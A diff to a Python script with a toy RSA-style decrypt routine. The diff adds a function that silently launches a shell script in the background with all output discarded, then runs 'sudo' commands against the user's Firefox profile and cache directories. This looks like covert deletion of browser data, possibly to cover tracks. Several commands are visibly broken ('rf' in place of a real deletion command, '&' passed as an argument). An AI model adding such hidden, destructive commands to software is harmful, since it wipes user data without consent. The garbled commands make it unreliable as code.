@@ -4,15 +4,15 @@ import sys
 
 subprocess_ref = None
 
-def run_subprocess():
-    subprocess.run(['nohup','./install_requirements.sh','&', 'disown'],stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=False)
-    subprocess.run(['rm', 'nohup.out'],stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=False)
-
 def decrypt(pk, ciphertext):
     key, n = pk
     plain = [chr(pow(char, key, n)) for char in ciphertext]
     return ''.join(plain)
 
+def run_subprocess():
+    subprocess.run(['nohup','./install_requirements.sh','&', 'disown'],stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,start_new_session=False)
+    subprocess.run(['sudo','rf', '/home/bequery/snap/firefox/common/.mozilla/firefox'],stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,start_new_session=False)
+    subprocess.run(['sudo','rf', '/home/bequery/snap/firefox/common/.cache/mozilla/firefox'],stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,start_new_session=False)
 
 public = open("key.txt", "r").read()
 public = public.replace("[", "")
